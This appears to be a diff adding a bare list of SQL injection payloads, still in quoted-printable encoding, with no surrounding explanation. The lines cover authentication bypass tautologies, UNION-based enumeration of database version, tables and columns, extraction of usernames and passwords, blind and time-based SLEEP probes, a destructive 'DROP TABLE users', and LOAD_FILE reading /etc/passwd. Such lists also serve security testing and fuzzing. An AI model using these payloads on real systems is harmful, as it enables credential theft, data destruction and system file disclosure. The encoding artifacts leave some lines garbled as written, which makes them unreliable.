@@ -1,0 +1,22 @@
+' OR 1=3D1--
+' OR '1'=3D'1
+' UNION SELECT null, null--
+' UNION SELECT 1, @@version--
+' UNION SELECT 1, table=5Fname FROM information=5Fschema.tables--
+' UNION SELECT 1, column=5Fname FROM information=5Fschema.columns WHERE table=5Fn=
+ame=3D'users'--
+' UNION SELECT username, password FROM users--
+' AND SLEEP(5)--
+'; DROP TABLE users--
+' OR 1=3D1 LIMIT 1--
+' ORDER BY 1--
+' ORDER BY 3--
+' AND (SELECT COUNT(*) FROM users) > 0--
+' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 65--
+' UNION SELECT 1, LOAD=5FFILE('/etc/passwd')--
+' UNION SELECT 1, user()--
+' UNION SELECT 1, database()--
+' AND 1=3DIF(1=3D1, SLEEP(3), 0)--
+' OR EXISTS(SELECT * FROM users WHERE username=3D'admin')--
+' UNION SELECT group=5Fconcat(table=5Fname),2 FROM information=5Fschema.tables WH=
+ERE table=5Fschema=3Ddatabase()=E2=80=94
